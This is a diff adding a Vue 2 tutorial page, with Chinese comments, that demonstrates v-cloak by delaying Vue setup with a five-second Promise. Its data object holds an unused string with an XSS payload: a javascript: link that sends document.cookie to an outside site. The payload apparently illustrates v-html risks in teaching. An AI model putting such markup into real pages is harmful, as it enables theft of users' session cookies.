@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+     <!-- 准备好一个容器 -->
+    <div id ="root">
+       <h2 v-cloak>{{name}}</h2>
+       <!-- 只要vue一介入，这个v-cloak属性就会被删掉,配合属性选择器的样式可以实现将为渲染的
+    模板dom隐藏 -->
+    </div>
+</body>
+    <script src="../js/vue.js"></script>
+    <!-- 如果这个js请求过慢，会让页面展示未经过vue渲染的初始模板dom -->
+    <script>
+        //演示一下，阻塞js
+        async function asyncFunction() {
+    return new Promise((resolve, reject) => {
+        setTimeout(function(){
+            resolve(1);
+        }, 5000);
+    });
+}
+        async function synchronousCall() {
+            let result = await asyncFunction();
+    console.log(result); // 输出 1
+    
+       
+    Vue.config.productionTip = false;
+        new Vue({
+            el:'#root',
+            data:{
+                name:'jack',
+                url:"http://www.atguigu.com",
+                str:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>神奇的网站</a>"
+            }
+        })
+}
+
+synchronousCall();
+console.log(2)
+    </script>
+</html>
